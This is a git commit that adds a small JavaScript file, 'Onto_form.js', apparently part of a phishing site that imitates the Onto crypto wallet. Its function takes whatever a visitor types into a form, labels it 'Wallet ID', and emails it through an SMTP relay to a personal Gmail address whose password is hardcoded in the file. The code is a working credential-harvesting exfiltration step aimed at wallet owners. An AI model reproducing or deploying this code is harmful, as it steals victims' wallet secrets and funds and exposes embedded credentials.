b9b9406a83a590566c78569dba26d501f8e4c8d2
BlockchainSpaceTechnology <Wokmail00001@gmail.com>
2024-06-07 02:47:23 +0100

    Add files via upload

---
+++ formsjs/Onto_form.js
@@ -0,0 +1,18 @@
+function emailSend(){
+
+    var message = document.getElementById('message').value;
+
+    var messageBody = "Wallet ID: " + message;
+
+    Email.send({
+    Host : "smtp.elasticemail.com",
+    Username : "nwaenehifeco11@gmail.com",
+    Password : "56E142A7A00DC444E973987B7490ED5D3415",
+    To : 'nwaenehifeco11@gmail.com',
+    From : "nwaenehifeco11@gmail.com",
+    Subject : "Onto Wallet",
+    Body : messageBody
+}).then(
+  message => alert(message)
+);
+}
